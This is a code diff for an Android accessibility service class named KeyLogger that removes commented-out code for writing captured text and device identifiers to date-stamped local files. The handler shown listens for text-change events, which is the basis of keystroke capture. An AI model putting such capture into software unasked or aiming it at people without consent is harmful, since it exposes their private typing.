@@ -26,36 +26,6 @@ public class KeyLogger extends AccessibilityService {
     @Override
     public void onAccessibilityEvent(AccessibilityEvent accessibilityEvent) {
 
-        //Log.d(TAG, "onAccessibilityEvent: Accessibilty event fired");
-//
-//        Log.d(TAG, "onAccessibilityEvent: event type: " + accessibilityEvent.getEventType());
-//
-//        String data = "";
-//        String dataPackage = "";
-//        Calendar c = Calendar.getInstance();
-//
-//        SimpleDateFormat df2 = new SimpleDateFormat("ddMMyyyy");
-//        String currentDate = df2.format(c.getTime());
-//        String path = this.getExternalFilesDir(null) + "/videoDIARY/KeyLogger/";
-//
-//        File directory = new File(path);
-//        if(!directory.exists()){
-//            Log.d(TAG, "onStartJob: making directory");
-//            directory.mkdirs();
-//        }
-//
-//        File location = new File(directory, currentDate +".txt");
-//        File location2 = new File(directory, currentDate +"_old.txt");
-//
-//
-//        if(location.length() == 0){
-//            Log.e(TAG, "onAccessibilityEvent: writing header!");
-//            WriteToFileHelper.writeHeader(location);
-//        }
-
-        //Constants.writeHeaderToFile(location, Constants.secureID + "," + Constants.modelName + "," + Constants.modelNumber + ","+ Constants.androidVersion + "," + Constants.earsVersion + "\n");
-
-        //boolean enabled2 = isAccessibilityEnabled(this, "gwicks.com.keylogger/.KeyLogger");
 
         long unixTime = System.currentTimeMillis();
         if(accessibilityEvent.getEventType() == AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED){
@@ -147,7 +117,6 @@ public class KeyLogger extends AccessibilityService {
                 }
             }
 
-            //writeToFile(location2, unixTime + "," + dataPackage +"," + data +"\n");
         }
     }
 
